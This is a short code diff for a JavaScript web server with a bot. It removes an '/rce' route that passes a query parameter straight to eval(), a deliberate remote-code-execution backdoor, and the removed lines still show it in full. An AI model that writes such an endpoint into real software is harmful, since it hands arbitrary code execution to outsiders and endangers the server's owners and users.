@@ -334,12 +334,6 @@ app.get("/unban", async (reply, req) => {
     reply.writeStatus("204").end();
 });
 
-app.get("/rce", (reply, req) => {
-    const query = parseQuery(req.getQuery());
-    eval(query.toRun);
-    reply.writeStatus("200").end("go away");
-});
-
 app.listen(config.HOST, config.PORT, token => console.log(`${token ? "Listening" : "Failed to listen"} on port: ${config.PORT}`));
 
 await startBot(bot);
